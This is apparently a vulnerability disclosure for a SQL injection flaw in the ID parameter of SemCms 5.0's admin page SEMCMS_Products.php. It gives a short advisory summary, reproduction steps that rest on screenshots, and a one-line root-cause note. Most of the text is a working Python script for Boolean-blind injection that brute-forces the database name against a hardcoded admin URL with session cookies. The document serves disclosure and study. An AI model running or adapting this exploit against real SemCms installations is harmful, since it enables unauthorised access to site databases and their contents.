# SemCms <= 5.0 has a SQL Injection Vulnerability
##### Vulnerability Location: SEMCMS_Products.php
##### Affected Range: SemCms <= 5.0
##### Vulnerability Cause: SemCms <= v5.0 was discovered to contain a SQL injection vulnerability.This allows an attacker to execute arbitrary code via the ID parameter in the SEMCMS_Products.php component.
##### Vulnerability Impact: Obtain database access rights, and even DBA permissions.
##### Link:https://www.sem-cms.com/

# Vulnerability recurrence

After entering the background,There is an injection vulnerability in ID. Obtain the length of the database name:

![image](https://github.com/user-attachments/assets/357cc738-41d3-45b7-bf12-6e2abd0e1331)
![image](https://github.com/user-attachments/assets/8e8bb822-1816-40ff-8aaa-94b2366b2e22)

Finally, the length of the database name obtained is 8. Next, the specific value of the database name is still obtained through Boolean blind annotation:

![image](https://github.com/user-attachments/assets/dc9dcc6e-7b53-4928-9e8d-2da001a57bc9)

Finally, the database username is obtained as semcms50

# Code Analysis
Line 59 of `SEMCMS_Products.php`

![image](https://github.com/user-attachments/assets/3c51dfc1-9346-4fd0-9c05-b5d94a7da0e6)

The ID parameters were directly concatenated into the SQL statement, thereby causing an SQL injection vulnerability

# Vulnerability exploitation script
```
import requests
import string
import time
from urllib.parse import parse_qs, urlencode
# 需要通过页面的回显来修改判断的条件
# 需要后台路径
# 需要更新Cookie

# 发送请求
def send_request(url, headers):
    try:
        response = requests.get(
            url,
            headers=headers,
            timeout=10,
            verify=False
        )

        return response
    except Exception as e:
        print(f"请求失败: {e}")
        return None


# 爆破数据库名长度
def database_length():
    print("[*] 开始爆破数据库名长度...")
    for i in range(1,20):
        base_url = url + f'if(length(database())>{i},999,1)'
        resp = send_request(base_url,header).text
        if 'Smart' in resp:
            print("数据库名长度为：" + str(i))
            return i 
            

# 爆破数据库名
def exploit_sql_injection(url, header, db_len):
    
    
    db_name = ""
    
    max_length = 32  # 假设数据库名最大长度
    
    # 字符集：小写字母、数字、常见符号
    charset = string.ascii_lowercase + string.digits + "-$@! "
    

    print("[*] 开始爆破数据库名...")

    for i in range(1,db_len+1):
        for j in charset:
            base_url = url + f'if(substr(database(),{i},1) like "{j}",1,999)'
            resp = send_request(base_url, header).text
            if 'Smart' in resp:
                db_name += str(j)
                print(f"[+] 第{i}个位置的字符: '{j}' 匹配成功, 当前: {db_name}")
                break

    
    print(f"[*] 爆破完成! 数据库名: {db_name}")
    return db_name

if __name__ == "__main__":
    url = f"http://192.168.124.6:81/VvK4qw_Admin/SEMCMS_Products.php?type=edit&ID="
    
    db_len = 0

    header = {
        "Cookie":"scusername=%E6%80%BB%E8%B4%A6%E5%8F%B7; scuseradmin=Admin; scuserpass=c4ca4238a0b923820dcc509a6f75849b"
    }

    db_len = database_length()

    if(db_len != 0):
        exploit_sql_injection(url, header,db_len)
    
```
